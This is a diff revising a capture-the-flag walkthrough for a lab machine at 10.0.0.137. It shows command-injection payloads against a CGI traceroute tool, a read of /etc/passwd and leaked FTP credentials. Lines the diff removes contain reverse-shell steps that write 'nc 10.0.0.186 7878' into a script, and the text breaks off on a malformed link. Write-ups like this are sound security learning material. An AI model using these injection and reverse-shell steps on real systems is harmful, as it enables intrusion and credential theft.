@@ -128,7 +128,7 @@ Looking at the source of `10.0.0.137/passwords/passwords.html` I see:
 
 * * *
 
-Moving on, I look at `http://10.0.0.137/robots.txt`
+Moving forward, I look at `http://10.0.0.137/robots.txt`
 
 ![Optional Text](/Rickdiculously%20Easy/_resources/82ef1851635e93951b8f688f44d6aa7a.png)
 ```
@@ -139,29 +139,20 @@ They're Robots Morty! It's ok to shoot them! They're just Robots!
 /cgi-bin/*
 ```
 
-I go to `10.0.0.137/cgi-bin/root_shell.cgi` hoping it was going to be this easy lol but I was quickly dissapointed!
+I go to `10.0.0.137/cgi-bin/root_shell.cgi` hoping it was going to be this easy lol, but I was quickly dissapointed!
 ![Optional Text](/Rickdiculously%20Easy/_resources/c1d060c970384b449cadc580c55915b8.png)
 
-`http://10.0.0.137/cgi-bin/tracertool.cgi`
+I then take a look at `http://10.0.0.137/cgi-bin/tracertool.cgi`
 ![Optional Text](/Rickdiculously%20Easy/_resources/9ac3412d75fd4194b063f8a52debd39d.png)
 
-Looking over everything I found so far I decided to dig into `http://10.0.0.137/cgi-bin/tracertool.cgi` a little further.
-
-After testing the input I releazed it was suscpetialbe to command injection
+I look at `http://10.0.0.137/cgi-bin/tracertool.cgi` and after testing I releazed it was suscpetialbe to command injection
 
 `1.1.1.1;uname -r` returned
 4.11.8-300.fc26.x86_64
 
-So lets see if I can get a shell, what would be great is if the vuln machine had netcat
-So I decided to see if it did
+I tried to get a reverse shell but didn't have anyluck so I attempted to print the output of the `/etc/passwd`
 
-`1.1.1.1;man nc`
-
-![Optional Text](/Rickdiculously%20Easy/_resources/9b996bd49cb441eba744c47f1d8e2a53.png)
-
-python3 -m http.server 8000
-
-curl http://127.0.0.1:8001/1.txt
+The cat command didn't work, but I encourage you to try, someone has a great since of humor! I used `nl` instead
 
 :nl /etc/passwd
 
@@ -173,30 +164,24 @@ Great now we have some usernames
 29 Summer:x:1002:1002::/home/Summer:/bin/bash
 30 apache:x:48:48:Apache:/usr/share/httpd:/sbin/nologin
 
-ls /home/RickSanchez
-ls /home/Morty
+My guess is the password `winter` has to belong to one of these users! After testing the creds We got in with **Summer&winter** via ftp.
 
 ## FTP Login
 
-After user creds Summer:winter I was able to get an FTP login
+After user creds **Summer:winter** I was able to get an FTP login
+
 ![Optional Text](/Rickdiculously%20Easy/_resources/33bd2ec1b02544c698bae44d6cef7f85.png)
 
 ## You can login using the sequence below
-
+```
 Ftp Command=`ftp 10.0.0.137`
 Username=`Summer`
 Password=`winter`
-
-`wget -m ftp://anonymous:anonymous@10.0.0.137`
-
-ls /home/RickSanchez
-ls /home/Morty
-
-;touch /usr/bin/hello.txt
-
-
-;base64 --decode /tmp/open.sh > /tmp/resh.sh
-;echo nc 10.0.0.186 7878 >> /tmp/resh.sh
+```
+Listing out the contents of Rick & Morty's home dir I see some interesting files
+![Optional Text](/Rickdiculously%20Easy/_resources/
+`ls /home/RickSanchez`
+`ls /home/Morty`
 
 [http://10.0.0.0.137/cgi-bin/tracertool.cgi?parameter=||whoami](http://10.0.0.0.137/cgi-bin/tracertool.cgi?
 
